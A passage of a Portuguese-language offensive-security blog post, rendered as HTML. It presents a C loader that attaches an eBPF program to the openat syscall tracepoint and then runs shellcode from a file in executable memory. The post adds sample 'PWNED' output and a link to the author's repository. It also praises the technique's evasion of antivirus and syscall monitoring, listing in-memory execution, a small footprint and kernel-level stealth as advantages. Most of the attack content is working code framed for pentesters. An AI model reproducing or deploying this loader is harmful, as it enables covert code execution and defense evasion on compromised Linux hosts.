+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">perror</span>(<span style="color:#008900">&#34;fread(shellcode)&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">munmap</span>(mem, size);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fclose</span>(f);
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">exit</span>(<span style="color:#008900">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">fclose</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> mem;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5f5fff">int</span> <span style="color:#5f5fff">main</span>(<span style="color:#5f5fff">int</span> argc, <span style="color:#5f5fff">char</span> <span style="color:#ec0000">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> bpf_object <span style="color:#ec0000">*</span>obj;
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> bpf_program <span style="color:#ec0000">*</span>prog;
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">struct</span> bpf_link <span style="color:#ec0000">*</span>link;
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">int</span> err;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bump_memlock_rlimit</span>();
+</span></span><span style="display:flex;"><span>    obj <span style="color:#ec0000">=</span> <span style="color:#5f5fff">bpf_object__open_file</span>(<span style="color:#008900">&#34;ebpf_prog.o&#34;</span>, <span style="color:#ec0000">NULL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>obj) {
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fprintf</span>(stderr, <span style="color:#008900">&#34;Error: Failed to open ebpf_prog.o</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">return</span> <span style="color:#008900">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    err <span style="color:#ec0000">=</span> <span style="color:#5f5fff">bpf_object__load</span>(obj);
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">if</span> (err) {
+</span></span><span style="display:flex;"><span>        <span style="color:#5f5fff">fprintf</span>(stderr, <span style="color:#008900">&#34;Error: Failed to load eBPF object: %d</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>, err);
+</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">return</span> <span style="color:#008900">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">bpf_object__for_each_program</span>(prog, obj) {
+</span></span><span style="display:flex;"><span>        link <span style="color:#ec0000">=</span> <span style="color:#5f5fff">bpf_program__attach</span>(prog);
+</span></span><span style="display:flex;"><span>        <span style="color:#ec0000">if</span> (<span style="color:#ec0000">!</span>link) {
+</span></span><span style="display:flex;"><span>            <span style="color:#5f5fff">fprintf</span>(stderr, <span style="color:#008900">&#34;Error: Failed to attach eBPF program</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#ec0000">return</span> <span style="color:#008900">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[+] eBPF loading and attached (tracepoint/syscalls:sys_enter_openat)</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">void</span> (<span style="color:#ec0000">*</span>shellcode_func)() <span style="color:#ec0000">=</span> <span style="color:#5f5fff">load_shellcode</span>(<span style="color:#008900">&#34;shellcode.bin&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">printf</span>(<span style="color:#008900">&#34;[+] Executing shellcode in memory...</span><span style="color:#008900">\n</span><span style="color:#008900">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#5f5fff">shellcode_func</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ec0000">return</span> <span style="color:#008900">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>Mass.. o que o loader faz?</strong></p>
+<ul>
+<li><strong>remove limitações de lock de memória que poderiam impedir o carregamento do eBPF</strong></li>
+<li><strong>carrega o arquivo compilado <code>ebpf_prog.o</code> com a função <code>bpf_object__open_file()</code></strong></li>
+<li><strong>anexa o eBPF no tracepoint <code>sys_enter_openat</code> via <code>bpf_program__attach()</code></strong></li>
+<li><strong>carrega o shellcode binário de um arquivo com o <code>mmap()</code> e permissões <code>PROT_EXEC</code></strong></li>
+<li><strong>e por fim, executa o shellcode imediatamente da memória</strong></li>
+</ul>
+<p><strong>Enfim, o resultado, se tudo ocorrer bem, o terminal exibirá algo como:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-6-0:checked ~ .tab-content-6-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-6" id="tab-6-0" checked/>
+<label for="tab-6-0" class="tab-label">bash</label>
+<div class="tab-content tab-content-6-0">
+  <div class="highlight"><pre tabindex="0" style="color:#757575;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ec0000">[</span>+<span style="color:#ec0000">]</span> eBPF loading and attached <span style="color:#ec0000">(</span>tracepoint/syscalls:sys_enter_openat<span style="color:#ec0000">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ec0000">[</span>+<span style="color:#ec0000">]</span> Executing shellcode in memory...
+</span></span><span style="display:flex;"><span>PWNED BY SLAYER%
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>Enfim, vou disponibilizar o meu github com o repositorio no final deste paper, para mais informações, junto com auxilio de execução e afins, de uma olhada no repo dele!</strong></p>
+<hr>
+<h1 id="4---análise-de-segurança">
+  4 - Análise de Segurança
+  <a class="heading-link" href="#4---an%c3%a1lise-de-seguran%c3%a7a">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h1>
+<p><strong>A utilização do eBPF como ferramenta para carregamento e execução de shellcodes representa uma abordagem bem inovadora dentro da área de offsec. Ao emparelhar o space exec do kernel com técnicas comuns de injeção e execução de código arbitrário, o pentester ganha uma forma sofisticada de alcançar seus objetivos com discrição e eficiência. No entanto, essa abordagem vem acompanhada de limitações que precisam ser entendidas antes de sua aplicação prática!</strong></p>
+<h2 id="vantagens">
+  Vantagens:
+  <a class="heading-link" href="#vantagens">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<ul>
+<li>
+<p><strong>1 - Execução direta da memória: o shellcode é lido diretamente de um arquivo binário (<code>shellcode.bin</code>) e mapeado para a memória utilizando a função <code>mmap()</code> com permissões <code>PROT_EXEC</code>. Isso significa que o código nunca toca o disco em formato executável, reduzindo consideravelmente a chance de ser detectado por antivírus tradicionais ou por ferramentas que monitoram arquivos executáveis temporários. Além disso, o shellcode é executado através de uma chamada direta (ponteiro de função), o que evita o uso de syscalls comuns (como <code>execve</code>) para iniciar um novo processo, dificultando sua identificação por ferramentas que monitoram syscalls.</strong></p>
+</li>
+<li>
+<p><strong>2 - Menor footprint: o loader em user-land é extremamente simples e pequeno. Ele apenas carrega o programa eBPF e mapeia o shellcode na memória. Isso significa que o binário pode passar despercebido em varreduras heurísticas, uma vez que sua estrutura não contém funções comuns de malware, como comunicação de rede, strings embutidas suspeitas ou chamadas de API incomuns.</strong></p>
+</li>
+<li>
+<p><strong>3 - Stealth via kernel-land: utilizar eBPF como ponto de entrada significa que o kernel está cooperando na execução, sem a necessidade de técnicas mais óbvias como o <code>LD_PRELOAD</code>, injeção por <code>ptrace</code>, ou modificações em libs do usuário. Além disso, interceptar syscalls (como <code>openat</code>) via tracepoint permite que ações legítimas do usuário (como abrir arquivos no terminal) sirvam como gatilhos naturais para a ativação do shellcode.</strong></p>
+</li>
+</ul>
+<h2 id="limitações">
+  Limitações:
+  <a class="heading-link" href="#limita%c3%a7%c3%b5es">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h2>
+<ul>
+<li>
+<p><strong>1 - Permissões elevadas (root): para carregar programas eBPF e manipular <code>RLIMIT_MEMLOCK</code>, é necessário ser root ou ter capacidades como <code>CAP_SYS_ADMIN</code>. Isso limita o uso em ambientes reais, onde a escalada de privilégio já deve ter ocorrido.</strong></p>
+</li>
+<li>
+<p><strong>2 - Visibilidade no <code>trace_pipe</code>: mesmo que o payload seja discreto, o uso de <code>bpf_printk()</code> envia mensagens para <code>/sys/kernel/debug/tracing/trace_pipe</code>. Se um analista estiver monitorando o <code>trace_pipe</code>, ele pode ver as strings e identificar a atividade.</strong></p>
+</li>
+<li>
+<p><strong>3 - Dependência de recursos do sistema: o loader depende de headers específicos do kernel e da <code>libbpf</code>, o que pode gerar problemas de compatibilidade ou facilitar a detecção em ambientes protegidos.</strong></p>
+</li>
+</ul>
+<hr>
+<h1 id="conclusão">
+  Conclusão!
+  <a class="heading-link" href="#conclus%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h1>
+<p><strong>A combinação entre eBPF e shellcode loaders demonstra como é possível aproveitar mecanismos mais avançados do kernel linux para executar código de forma discreta e controlada. Com o eBPF, interceptamos chamadas de sistema diretamente no kernel, ativando rotinas personalizadas sem modificar arquivos no disco ou depender de hooks tradicionais. Ao carregar o shellcode em memória com o <code>mmap</code> e permissões de execução, garantimos que a execução ocorra inteiramente no user-land, sem deixar rastros evidentes no sistema. Essa técnica oferece vantagens como menor footprint, execução direta da memória e ativação baseada em eventos REAIS do sistema. Apesar de exigir permissões elevadas como root, e poder ser monitorada com ferramentas apropriadas, ela exemplifica o potencial do eBPF não apenas como ferramenta de observabilidade e segurança, mas também como mecanismo para automação e controle de fluxos de execução</strong></p>
+<hr>
+<h3 id="source-github">
+  Source github
+  <a class="heading-link" href="#source-github">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<ul>
+<li><strong><a href="https://github.com/slayerkkkk/ebpf_loader"  class="external-link" target="_blank" rel="noopener">ebpf_loader - github</a></strong></li>
+</ul>
+<h3 id="fontes-utilizadas-para-construir-este-artigo">
+  <strong>Fontes utilizadas para construir este artigo</strong>
+  <a class="heading-link" href="#fontes-utilizadas-para-construir-este-artigo">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
+  </a>
+</h3>
+<ul>
+<li><strong><a href="https://docs.kernel.org/bpf/index.html"  class="external-link" target="_blank" rel="noopener">Linux Kernel Documentation - eBPF</a></strong></li>
+<li><strong><a href="https://man7.org/linux/man-pages/man2/bpf.2.html"  class="external-link" target="_blank" rel="noopener">bpf(2) - Linux syscall manual</a></strong></li>
+<li><strong><a href="https://github.com/libbpf/libbpf"  class="external-link" target="_blank" rel="noopener">libbpf: BPF CO-RE reference and usage</a></strong></li>
+<li><strong><a href="http://www.brendangregg.com/blog/2019-01-01/learn-ebpf-tracing.html"  class="external-link" target="_blank" rel="noopener">tracepoints in eBPF - Brendan Gregg</a></strong></li>
+<li><strong><a href="https://docs.kernel.org/trace/tracepoints.html"  class="external-link" target="_blank" rel="noopener">Understanding Tracepoints — Kernel docs</a></strong></li>
+<li><strong><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html"  class="external-link" target="_blank" rel="noopener">RLIMIT_MEMLOCK - getrlimit(2)</a></strong></li>
+<li><strong><a href="https://man7.org/linux/man-pages/man2/mmap.2.html"  class="external-link" target="_blank" rel="noopener">mmap(2) - Memory mapping</a></strong></li>
+<li><strong><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html"  class="external-link" target="_blank" rel="noopener">ptrace(2) and ptrace-based introspection</a></strong></li>
+<li><strong><a href="https://lwn.net/Articles/740157/"  class="external-link" target="_blank" rel="noopener">eBPF Security Model (LWN)</a></strong></li>
+<li><strong><a href="https://ebpf.io/what-is-ebpf/"  class="external-link" target="_blank" rel="noopener">The eBPF Handbook (by Quentin Monnet)</a></strong></li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
+    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
+    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
+    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     pwnbuffer 
+    ·
+    
+    Promovido por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
